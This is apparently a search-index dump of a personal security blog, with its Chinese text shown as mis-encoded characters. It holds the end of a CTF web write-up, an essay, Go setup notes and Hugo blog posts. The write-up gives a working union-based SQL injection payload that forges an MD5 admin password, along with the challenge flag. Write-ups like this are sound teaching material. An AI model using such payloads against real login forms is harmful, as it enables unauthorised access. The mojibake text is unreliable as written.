ï¼Œå‘ç°æœ‰search.phpçš„æç¤ºä¿¡æ¯ï¼ŒæŸ¥çœ‹search.phpï¼Œå¯ä»¥çœ‹åˆ° \u003c!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /\u003e \u003ctitle\u003eDo you know who am I?\u003c/title\u003e wrong user! ä¸Šé¢çš„æ˜¯base32ç¼–ç ï¼Œè§£ç å¾—åˆ°c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==ï¼Œå†ç»è¿‡base64è§£ç å¾—åˆ°è¯¥ç½‘ç«™çš„sqlæŸ¥è¯¢è¯­å¥select * from user where username = '$name'ã€‚ æŸ¥è¯¢è¯­å¥é‡Œæ²¡æœ‰å¯†ç å­—æ®µï¼Œæ‰€ä»¥å¯ä»¥æ¨æµ‹ï¼Œå¯†ç å­—æ®µåº”è¯¥æ˜¯åœ¨åç«¯è¢«æ‹¿æ¥å¯¹æ¯”äº†ã€‚åŒæ—¶å†çŒœæµ‹ï¼ˆğŸ˜‚å¥½å§å…¶å®æ˜¯æŸ¥é˜…åšå®¢ï¼Œä½†æ˜¯è¿™äº›åšå®¢ä¹Ÿæ²¡å“ªä¸ªè®²æ¸…é™¤äº†ï¼‰æ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥çš„å€¼çš„md5ä¸å¯†ç çš„md5ç»“æœç›¸å¯¹æ¯”ã€‚ çŒœåˆ°è¿™é‡Œå°±å¯ä»¥åšäº†ã€‚ä½¿ç”¨unionè”åˆæŸ¥è¯¢æ„é€ æŸ¥è¯¢ç»“æœï¼Œå°±å¯ä»¥è‡ªå·±æ§åˆ¶md5å†…å®¹ï¼Œç„¶åå†è¾“å…¥å¯¹åº”çš„å¯†ç å†…å®¹å³å¯ã€‚ payloadï¼š a' union select 1, 'admin', '900150983cd24fb0d6963f7d28e17f72'# abc flag{35de0117-ce39-40bd-8de4-40535e1a5274} ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:8:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½• 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x07-gxyctf2019babysqli"},{"categories":["æ–‡å­—"],"content":"å¼€é—¨è§å±±ï¼Œè¿™ä¸ªæ ‡é¢˜å°±æ˜¯æˆ‘è¿™æ®µæ—¶é—´æ„Ÿå—æœ€æ·±çš„é“ç†ã€‚ ç°ä»£ç¤¾ä¼šï¼Œç”±äºæŠ€æœ¯çš„è¿›æ­¥ï¼Œæˆ‘ä»¬æ€»æ˜¯å¾ˆå®¹æ˜“å°±è·å¾—çŸ­æš‚çš„å¿«æ„Ÿï¼šç©å‡ ç›˜lolã€åˆ·ä¸€åˆ·æŠ–éŸ³ã€‚è¿™äº›æ´»åŠ¨åœ¨ç°ä»£äººçš„ç”Ÿæ´»ä¸­çœŸçš„æ˜¯å¸ç©ºè§æƒ¯ã€‚ä½†æ˜¯å¾ˆå¤šäººå¹¶æ²¡æœ‰æ„è¯†åˆ°ä¸€ç‚¹ï¼Œå½“ä¸€ä¸ªäººä¹ æƒ¯äºè¿™ç§ç®€å•ã€å»‰ä»·ã€æ˜“äºè·å¾—çš„å¿«ä¹æ—¶ï¼Œtaä¼šå‘ç°è‡ªå·±é¢å¯¹ä¸€äº›éœ€è¦ä»˜è¯¸åŠªåŠ›ä¸æ±—æ°´æ‰èƒ½è·å¾—æˆæœçš„äº‹æƒ…æ—¶ï¼Œä¼šå¾ˆå®¹æ˜“é€‰æ‹©æ”¾å¼ƒã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„é“ç†ï¼Œå°±å¦‚â€œç”±ä¿­å…¥å¥¢æ˜“ï¼Œç”±å¥¢å…¥ä¿­éš¾â€ã€‚ å…¶å®è¿‡å»çš„æˆ‘ä¹Ÿæ—¶å¸¸æ²‰æººäºç®€å•å»‰ä»·çš„å¿«ä¹ä¹‹ä¸­ã€‚åœ¨å¤„äºè·å¾—å»‰ä»·å¿«ä¹çš„æ—¶é—´ç‚¹æ—¶ï¼Œç¡®å®å¾ˆå¿«ä¹ï¼Œä½†æ˜¯å½“è¿™äº›äº‹æƒ…ç»“æŸä¹‹åï¼Œæˆ‘æ—¶å¸¸ä¼šæ„Ÿåˆ°ç©ºè™šï¼Œæ„Ÿè§‰è™šåº¦äº†å…‰é˜´ã€‚ä¹…è€Œä¹…ä¹‹ï¼Œæˆ‘å¼€å§‹å¯¹é‚£äº›éœ€è¦ä»˜å‡ºæ‰èƒ½è·å¾—çš„é•¿è¿œæ€§è´¨çš„å¿«ä¹æ¸æ¸å¤±å»è€å¿ƒã€‚â€œçœ‹ä¸€éƒ¨ç”µå½±å¥½ä¹…å•Šï¼Œè¿˜ä¸å¦‚ç›´æ¥ç©å‡ ç›˜lolâ€ã€â€œçœ‹ä¹¦è¿˜éœ€è¦åŠ¨è„‘å­æ€è€ƒï¼Œä¸å¦‚ç©å‡ å±€lolï¼Œæ”¾æ¾ä¸€ä¸‹â€ã€‚è¿™äº›æ€è€ƒçš„åœºæ™¯ç¡®ç¡®å®å®åœ¨æˆ‘çš„è„‘æµ·ä¸­å‡ºç°è¿‡ã€‚å› æ­¤ï¼Œæˆ‘å¸Œæœ›åœ¨æ¥ä¸‹æ¥çš„ç”Ÿæ´»é‡Œï¼Œé€æ¸å‡å°‘è¿™ç§å»‰ä»·å¿«ä¹çš„æ‘„å–ã€‚æˆ‘å¼€å§‹å‡å°‘è‡ªå·±ç©lolçš„æ•°é‡ï¼Œå³ä½¿æƒ³ç©æ¸¸æˆä¹Ÿå¼ºè¿«è‡ªå·±å»ç©é‚£äº›éœ€è¦æ€è€ƒã€æœ‰å‰§æƒ…çš„æ¸¸æˆã€‚æˆ‘å¼€å§‹ç”¨kindleå®‰é™åœ°çœ‹ä¹¦ï¼Œå¹¶ä¸”å¼ºè¿«è‡ªå·±å†™ä¸‹å¯¹äºçœ‹è¿‡çš„ä¹¦çš„æ€è€ƒä¸æ„Ÿæ‚Ÿã€‚æˆ‘ä¹Ÿå¼€å§‹åœ¨æ¯å‘¨ä¸ºè‡ªå·±å‡†å¤‡ä¸€éƒ¨ç”µå½±ï¼Œçœ‹çš„æ—¶å€™è®¤çœŸçœ‹ï¼Œè¯•ç€ä»è‡ªå·±çš„è§’åº¦æ€è€ƒç”µå½±æƒ³è¦ä¼ è¾¾çš„å†…å®¹ä¸æ€æƒ³ã€‚æˆ‘ç”šè‡³è¿˜å¼€å§‹åšæŒé•¿è·‘ï¼Œæ¯æ¬¡3kmä»¥ä¸Šï¼Œå¼ºè¿«è‡ªå·±ä¹ æƒ¯äºå…ˆæµæ±—å†è·å¾—æˆå°±æ„Ÿçš„è¿‡ç¨‹ã€‚ å¹¸è¿çš„æ˜¯ï¼Œè¿™äº›äº‹æƒ…ç¡®å®æ”¹å˜äº†æˆ‘çš„æ€ç»´æ–¹å¼ï¼Œå¹¶ä¸”ä¹‹å‰æ²‰æººäºç®€å•å»‰ä»·å¿«ä¹æ‰€ç»™æˆ‘å¸¦æ¥çš„æ¶ˆæå½±å“ä¹Ÿæ²¡æœ‰åˆ°æ— æ³•æ ¹é™¤çš„åœ°æ­¥ã€‚ æœ‰æ„Ÿè€Œå‘ï¼Œåˆå†™äº†ä¸€äº›æ°´å¹³å¾ˆä½çš„æ–‡å­—ï¼Œæƒ­æ„§æƒ­æ„§ã€‚ æ„¿èƒ½æ›´åŠ ä»å®¹å……å®åœ°åº¦è¿‡è‡ªå·±çš„æ¯ä¸€å¤©ã€‚ ","date":"2021-06-29","objectID":"/2021-06-29-%E5%BF%AB%E4%B9%90%E6%9C%AC%E5%B0%B1%E4%B8%8D%E8%AF%A5%E5%BB%89%E4%BB%B7/:0:0","series":null,"tags":["Life"],"title":"å¿«ä¹æœ¬å°±ä¸è¯¥å»‰ä»·","uri":"/2021-06-29-%E5%BF%AB%E4%B9%90%E6%9C%AC%E5%B0%B1%E4%B8%8D%E8%AF%A5%E5%BB%89%E4%BB%B7/#"},{"categories":["ç¯å¢ƒé…ç½®ç³»åˆ—"],"content":"å…¶å®å°±æ˜¯æƒ³è®°å½•ä¸€ä¸‹æ­£ç¡®è®¾ç½®GOPROXYçš„å‘½ä»¤ ","date":"2021-06-24","objectID":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:0:0","series":null,"tags":["Golang"],"title":"Win10+go+vscode ç¯å¢ƒé…ç½®","uri":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#"},{"categories":["ç¯å¢ƒé…ç½®ç³»åˆ—"],"content":"0x00 Goç¯å¢ƒå®‰è£… windowsçš„goå®‰è£…æ˜¯ååˆ†ç®€å•çš„ã€‚ç›´æ¥å»å®˜ç½‘ä¸‹è½½msiå®‰è£…åŒ…ï¼Œç„¶åè¿è¡Œå³å¯ï¼Œç¯å¢ƒå˜é‡ã€GOPATHä»€ä¹ˆçš„ä¹Ÿä¸ç”¨è‡ªå·±é…ç½®ï¼Œå®ƒä¼šè‡ªåŠ¨å¸®ä½ å¼„å¥½ã€‚å¦‚æœæ˜¯å‡çº§çš„è¯ï¼Œè¿˜èƒ½è‡ªåŠ¨å¸è½½æ—§ç‰ˆæœ¬çš„goã€‚ ","date":"2021-06-24","objectID":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["Golang"],"title":"Win10+go+vscode ç¯å¢ƒé…ç½®","uri":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#0x00-goç¯å¢ƒå®‰è£…"},{"categories":["ç¯å¢ƒé…ç½®ç³»åˆ—"],"content":"0x01 vscodeç¯å¢ƒé…ç½® å®‰è£…goæ’ä»¶ vscodeçš„goæ’ä»¶go.png \" vscodeçš„goæ’ä»¶ ç„¶åæŒ‰ç…§è·³å‡ºæ¥çš„æç¤ºï¼Œå®‰è£…gopls/go-outlineç­‰ä¸€ç³»åˆ—å·¥å…·ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œgo envå¯ä»¥çœ‹åˆ°ï¼Œé»˜è®¤çš„GOPROXYä¸ºhttps://proxy.golang.org,directï¼Œä½†æ˜¯å›½å†…æ˜¯æ— æ³•è®¿é—®çš„ã€‚äºæ˜¯è§£å†³åŠæ³•æ¥äº†ï¼Œåœ¨ä¸fqçš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤go env -w GOPROXY=https://goproxy.cn,directï¼Œç„¶åå†å®‰è£…ï¼Œå°±å¯ä»¥æˆåŠŸä¸‹è½½å¹¶å®‰è£…è¿™äº›å·¥å…·ã€‚ äºæ˜¯ï¼Œå°±å¯ä»¥åœ¨windowsä¸Šä½¿ç”¨vscodeè¿›è¡Œgoå¼€å‘äº†ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œwindowsè¿˜å¯ä»¥é…åˆwslé…ç½®linuxä¸Šçš„goå¼€å‘ç¯å¢ƒ ","date":"2021-06-24","objectID":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["Golang"],"title":"Win10+go+vscode ç¯å¢ƒé…ç½®","uri":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#0x01-vscodeç¯å¢ƒé…ç½®"},{"categories":null,"content":"Something you may want to know about me: Interested in computerğŸ’»/programmingğŸ‘¨â€ğŸ’»/CTFğŸš©/basketballğŸ€/gamesğŸ®/moviesğŸ“½ï¸/readingğŸ“™ and so many other things â€¦ Undergraduate in SJTU (graduated in 2020.07) Postgraduate in SJTU (expected to graduate in 2023.03)ğŸ‘¨â€ğŸ“ My goal is to be a skilled security practitioner and developerğŸƒâ€â™‚ï¸ ","date":"2021-06-14","objectID":"/about/:0:1","series":null,"tags":null,"title":"å…³äºæˆ‘","uri":"/about/#something-you-may-want-to-know-about-me"},{"categories":["Hugo"],"content":"Hello World! ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:0:0","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#"},{"categories":["Hugo"],"content":"æ ‡é¢˜æµ‹è¯• ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:0:0","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#æ ‡é¢˜æµ‹è¯•"},{"categories":["Hugo"],"content":"äºŒçº§æ ‡é¢˜ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:0","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#äºŒçº§æ ‡é¢˜"},{"categories":["Hugo"],"content":"ä¸‰çº§æ ‡é¢˜ å››çº§æ ‡é¢˜ äº”çº§æ ‡é¢˜ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:1","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#ä¸‰çº§æ ‡é¢˜"},{"categories":["Hugo"],"content":"ä¸‰çº§æ ‡é¢˜ å››çº§æ ‡é¢˜ äº”çº§æ ‡é¢˜ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:1","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#å››çº§æ ‡é¢˜"},{"categories":["Hugo"],"content":"ä¸‰çº§æ ‡é¢˜ å››çº§æ ‡é¢˜ äº”çº§æ ‡é¢˜ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:1","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#äº”çº§æ ‡é¢˜"},{"categories":["Hugo"],"content":"ä»£ç å— def main(): print(\"hello world\") è¡Œå†…ä»£ç å—code ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:2","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#ä»£ç å—"},{"categories":["Hugo"],"content":"è¡¨æ ¼ test1 retes essetqq eqf24 13 13 36u6 63y4t25 13 edwfd 24 t5y6 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:3","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#è¡¨æ ¼"},{"categories":["Hugo"],"content":"æ•°å­¦å…¬å¼ï¼Ÿ è¡Œå†…å…¬å¼ $x = y\\times z$ å¤šè¡Œå…¬å¼ $$ x^{y^z}=(1+{\\rm e}^x)^{-2xy^w} $$ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:4","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#æ•°å­¦å…¬å¼"},{"categories":["Hugo"],"content":"æ–‡å­—æ ·å¼ å¼•ç”¨ ==é«˜äº®== åŠ ç²— åˆ’çº¿ æ–œä½“ æ­£å¸¸æ–‡å­—å†…å®¹ é“¾æ¥ emojiï¼š ğŸ˜„ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:5","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#æ–‡å­—æ ·å¼"},{"categories":["Hugo"],"content":"å›¾ç‰‡å¼•ç”¨ img1img1 \" img1 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:6","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#å›¾ç‰‡å¼•ç”¨"},{"categories":["Hugo"],"content":"shortcodeä½¿ç”¨ admonition æ³¨æ„ ä¸€ä¸ª æ³¨æ„ æ¨ªå¹… æ‘˜è¦ ä¸€ä¸ª æ‘˜è¦ æ¨ªå¹… ä¿¡æ¯ ä¸€ä¸ª ä¿¡æ¯ æ¨ªå¹… æŠ€å·§ ä¸€ä¸ª æŠ€å·§ æ¨ªå¹… æˆåŠŸ ä¸€ä¸ª æˆåŠŸ æ¨ªå¹… é—®é¢˜ ä¸€ä¸ª é—®é¢˜ æ¨ªå¹… è­¦å‘Š ä¸€ä¸ª è­¦å‘Š æ¨ªå¹… å¤±è´¥ ä¸€ä¸ª å¤±è´¥ æ¨ªå¹… å±é™© ä¸€ä¸ª å±é™© æ¨ªå¹… Bug ä¸€ä¸ª Bug æ¨ªå¹… ç¤ºä¾‹ ä¸€ä¸ª ç¤ºä¾‹ æ¨ªå¹… å¼•ç”¨ ä¸€ä¸ª å¼•ç”¨ æ¨ªå¹… bilibili -- ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:7","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#shortcodeä½¿ç”¨"},{"categories":["Hugo"],"content":"shortcodeä½¿ç”¨ admonition æ³¨æ„ ä¸€ä¸ª æ³¨æ„ æ¨ªå¹… æ‘˜è¦ ä¸€ä¸ª æ‘˜è¦ æ¨ªå¹… ä¿¡æ¯ ä¸€ä¸ª ä¿¡æ¯ æ¨ªå¹… æŠ€å·§ ä¸€ä¸ª æŠ€å·§ æ¨ªå¹… æˆåŠŸ ä¸€ä¸ª æˆåŠŸ æ¨ªå¹… é—®é¢˜ ä¸€ä¸ª é—®é¢˜ æ¨ªå¹… è­¦å‘Š ä¸€ä¸ª è­¦å‘Š æ¨ªå¹… å¤±è´¥ ä¸€ä¸ª å¤±è´¥ æ¨ªå¹… å±é™© ä¸€ä¸ª å±é™© æ¨ªå¹… Bug ä¸€ä¸ª Bug æ¨ªå¹… ç¤ºä¾‹ ä¸€ä¸ª ç¤ºä¾‹ æ¨ªå¹… å¼•ç”¨ ä¸€ä¸ª å¼•ç”¨ æ¨ªå¹… bilibili -- ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:7","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#admonition"},{"categories":["Hugo"],"content":"ä»hexoæ¢åˆ°hugo ä¹‹å‰çš„åšå®¢æ˜¯ä½¿ç”¨hexo+github pageåšçš„ã€‚ä¸€å¼€å§‹æ„Ÿè§‰è¿˜è¡Œï¼Œä½†æ˜¯åˆ°åæ¥å‘ç°ï¼Œhexoå¾ˆä»¤äººæ„Ÿåˆ°åŒçƒ¦ä»¥åŠææƒ§çš„ä¸€ç‚¹ï¼Œå°±æ˜¯ä¾èµ–ä¼—å¤šçš„jsåº“ï¼Œä¸”éœ€è¦é¢‘ç¹æ›´æ–°ï¼Œä»¥åŠåºå¤§çš„node_mudolesç›®å½•ï¼Œè¿™äº›ä¼šç»™åšå®¢åç»­çš„ç»´æŠ¤å¸¦æ¥æ··ä¹±ã€‚ä¹‹å‰çœ‹è¿‡åˆ«äººç”¨hugoæ­åšå®¢çš„ï¼Œäºæ˜¯ä¹Ÿè‡ªå·±å°è¯•äº†ä¸€ä¸‹ï¼ŒæŠŠä»¥å‰çš„æ–‡ç« è¿ç§»åˆ°äº†ç°åœ¨çš„åšå®¢ä¸Šã€‚ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:0","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#ä»hexoæ¢åˆ°hugo"},{"categories":["Hugo"],"content":"ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ hexoä½¿ç”¨çš„frontmatterä¸­çš„ç›®å½•å­—æ®µä¸ºcategoriesï¼Œä¸hexoçš„categoryç•¥æœ‰ä¸åŒ ç”±äºhexoä¼šè‡ªåŠ¨è§£æindex.md/index.zh-cn.mdç­‰æ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥ç›®å‰å†™æ–‡ç« çš„æ¨¡å¼ï¼Œæ˜¯å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ç« æ ‡é¢˜çš„æ–‡ä»¶å¤¹ï¼Œç„¶ååœ¨å…¶ä¸­æ·»åŠ index.mdæ–‡ä»¶ã€‚å› ä¸ºæˆ‘æ²¡æœ‰è®¾ç½®å¤šè¯­è¨€ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¸åŒåŠ ä¸Šzh-cnç­‰åç¼€ å¯¹äºä¸€ä»½å†…å®¹ä¸ºç©º(ä¸ç®—frontmatter)çš„mdæ–‡ä»¶ï¼Œhugoæ¸²æŸ“ä¼šå‡ºé”™ã€‚è§£å†³åŠæ³•å°±æ˜¯å°†å…¶å‘½åä¸º_index.md å…³äºè¿™ä¸€ä¸»é¢˜LoveItï¼Œæ³¨æ„åˆ°ä¸å¤ªæ‡‚çš„ä¸€ç‚¹ï¼Œå¦‚æœæƒ³è¦å°†æ–‡ç« å†…çš„å›¾ç‰‡ä»¥ç”»å»Šå½¢å¼å±•ç¤ºçš„è¯ï¼Œé™¤äº†åœ¨config.tomlé…ç½®æ–‡ä»¶ä¸­å°†lightgalleryå€¼è®¾ä¸ºtrueï¼Œè¿˜éœ€è¦åœ¨mdæ–‡ä»¶ä¸­æ’å…¥å›¾ç‰‡æ—¶ï¼Œå°†å…¶å†™æˆ![title-optional](src \"title\")çš„å½¢å¼ï¼Œå°±åƒè¿™æ ·ï¼š image-20210619163825192image-20210619163825192 \" image-20210619163825192 å°†é€‰å¥½çš„å›¾æ ‡åœ¨ç½‘ç«™https://realfavicongenerator.net/ç”Ÿæˆæ‰€æœ‰å›¾æ ‡èµ„æºï¼Œç„¶åç›´æ¥æ”¾åœ¨/static/ç›®å½•å³å¯ psï¼šè®°å½•ä¸€ä¸ªç”¨valine+leancloudå®Œæˆè¯„è®ºç³»ç»Ÿä¸ç»Ÿè®¡åŠŸèƒ½çš„åšæ–‡ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:1","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹"},{"categories":["Hugo"],"content":"å…³äºéƒ¨ç½² æˆ‘ä½¿ç”¨çš„æ˜¯ç›´æ¥ç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œç„¶åæ‰‹åŠ¨å°†é™æ€æ–‡ä»¶pushåˆ°è¿œç¨‹ä»“åº“çš„æ–¹æ³•ã€‚å¹¶ä¸”ç”±äºæˆ‘æœ‰å¤šä¸ªä¸åŒçš„githubè´¦æˆ·ï¼Œæ‰€ä»¥åœ¨é€šè¿‡ssh keyè¿›è¡Œpushçš„è¿‡ç¨‹ä¸­ï¼Œè¿˜éœ€è¦è§£å†³è‡ªå®šä¹‰ç§é’¥çš„é—®é¢˜ã€‚ gitæ¨é€ åœ¨åšå®¢å·¥ç¨‹é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œhugoï¼Œç”Ÿæˆé™æ€æ–‡ä»¶ã€‚å¦‚æœè¿è¡Œhugo -Dçš„è¯ï¼Œåˆ™ä¼šæŠŠdraft: trueçš„æ–‡ç« ä¹Ÿè¿›è¡Œæ¸²æŸ“ è¿›å…¥åˆ°å­˜æ”¾é™æ€æ–‡ä»¶çš„publicç›®å½•ä¸‹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ git remote add origin \u003cyour ssh git url\u003e git add . git commit -m 'first commit message' git push -u origin master è‡ªå®šä¹‰ç§é’¥ æ‰“å¼€ä½ çš„ssh configæ–‡ä»¶ï¼Œwindowsçš„è·¯å¾„åº”è¯¥ä¸ºC:\\Users\\\u003cusername\u003e\\.ssh\\config åœ¨å…¶ä¸­åŠ å…¥ä»¥ä¸‹å†…å®¹ Host \u003cä¸€ä¸ªèƒ½å¤Ÿèµ·æ ‡è¯†ä½œç”¨çš„åˆ«å\u003e HostName github.com User git IdentityFile \u003cä½ è‡ªå®šä¹‰çš„ç§é’¥\u003e IdentitiesOnly yes ä¾‹å¦‚ï¼Œæˆ‘å°†Hostçš„å€¼å¡«ä¸ºgitForLzyï¼Œé‚£ä¹ˆæˆ‘åœ¨add originçš„æ—¶å€™å°±ä¼šè¿™æ ·ï¼šgit remote add origin git@gitForLzy:myname/myname.github.io ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:2","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#å…³äºéƒ¨ç½²"},{"categories":["Hugo"],"content":"å…³äºéƒ¨ç½² æˆ‘ä½¿ç”¨çš„æ˜¯ç›´æ¥ç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œç„¶åæ‰‹åŠ¨å°†é™æ€æ–‡ä»¶pushåˆ°è¿œç¨‹ä»“åº“çš„æ–¹æ³•ã€‚å¹¶ä¸”ç”±äºæˆ‘æœ‰å¤šä¸ªä¸åŒçš„githubè´¦æˆ·ï¼Œæ‰€ä»¥åœ¨é€šè¿‡ssh keyè¿›è¡Œpushçš„è¿‡ç¨‹ä¸­ï¼Œè¿˜éœ€è¦è§£å†³è‡ªå®šä¹‰ç§é’¥çš„é—®é¢˜ã€‚ gitæ¨é€ åœ¨åšå®¢å·¥ç¨‹é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œhugoï¼Œç”Ÿæˆé™æ€æ–‡ä»¶ã€‚å¦‚æœè¿è¡Œhugo -Dçš„è¯ï¼Œåˆ™ä¼šæŠŠdraft: trueçš„æ–‡ç« ä¹Ÿè¿›è¡Œæ¸²æŸ“ è¿›å…¥åˆ°å­˜æ”¾é™æ€æ–‡ä»¶çš„publicç›®å½•ä¸‹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ git remote add origin git add . git commit -m 'first commit message' git push -u origin master è‡ªå®šä¹‰ç§é’¥ æ‰“å¼€ä½ çš„ssh configæ–‡ä»¶ï¼Œwindowsçš„è·¯å¾„åº”è¯¥ä¸ºC:\\Users\\\\.ssh\\config åœ¨å…¶ä¸­åŠ å…¥ä»¥ä¸‹å†…å®¹ Host HostName github.com User git IdentityFile IdentitiesOnly yes ä¾‹å¦‚ï¼Œæˆ‘å°†Hostçš„å€¼å¡«ä¸ºgitForLzyï¼Œé‚£ä¹ˆæˆ‘åœ¨add originçš„æ—¶å€™å°±ä¼šè¿™æ ·ï¼šgit remote add origin git@gitForLzy:myname/myname.github.io ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:2","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#gitæ¨é€"},{"categories":["Hugo"],"content":"å…³äºéƒ¨ç½² æˆ‘ä½¿ç”¨çš„æ˜¯ç›´æ¥ç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œç„¶åæ‰‹åŠ¨å°†é™æ€æ–‡ä»¶pushåˆ°è¿œç¨‹ä»“åº“çš„æ–¹æ³•ã€‚å¹¶ä¸”ç”±äºæˆ‘æœ‰å¤šä¸ªä¸åŒçš„githubè´¦æˆ·ï¼Œæ‰€ä»¥åœ¨é€šè¿‡ssh keyè¿›è¡Œpushçš„è¿‡ç¨‹ä¸­ï¼Œè¿˜éœ€è¦è§£å†³è‡ªå®šä¹‰ç§é’¥çš„é—®é¢˜ã€‚ gitæ¨é€ åœ¨åšå®¢å·¥ç¨‹é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œhugoï¼Œç”Ÿæˆé™æ€æ–‡ä»¶ã€‚å¦‚æœè¿è¡Œhugo -Dçš„è¯ï¼Œåˆ™ä¼šæŠŠdraft: trueçš„æ–‡ç« ä¹Ÿè¿›è¡Œæ¸²æŸ“ è¿›å…¥åˆ°å­˜æ”¾é™æ€æ–‡ä»¶çš„publicç›®å½•ä¸‹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ git remote add origin git add . git commit -m 'first commit message' git push -u origin master è‡ªå®šä¹‰ç§é’¥ æ‰“å¼€ä½ çš„ssh configæ–‡ä»¶ï¼Œwindowsçš„è·¯å¾„åº”è¯¥ä¸ºC:\\Users\\\\.ssh\\config åœ¨å…¶ä¸­åŠ å…¥ä»¥ä¸‹å†…å®¹ Host HostName github.com User git IdentityFile IdentitiesOnly yes ä¾‹å¦‚ï¼Œæˆ‘å°†Hostçš„å€¼å¡«ä¸ºgitForLzyï¼Œé‚£ä¹ˆæˆ‘åœ¨add originçš„æ—¶å€™å°±ä¼šè¿™æ ·ï¼šgit remote add origin git@gitForLzy:myname/myname.github.io ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:2","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#è‡ªå®šä¹‰ç§é’¥"},{"categories":["Linux"],"content":"å‰è¨€ æœ€è¿‘åœ¨çœ‹runcæœ€æ–°çš„CVE-2021-30465æ¼æ´çš„æ—¶å€™ç»å¸¸çœ‹åˆ°ç¬¦å·é“¾æ¥(symbolic link)è¿™ä¸ªæ¦‚å¿µï¼Œè„‘æµ·ä¸­å¯¹äºè¿™ä¸€æ¦‚å¿µä¼¼ä¹ä¹Ÿæœ‰ç‚¹å°è±¡ï¼Œä½†æ˜¯å§‹ç»ˆæ— 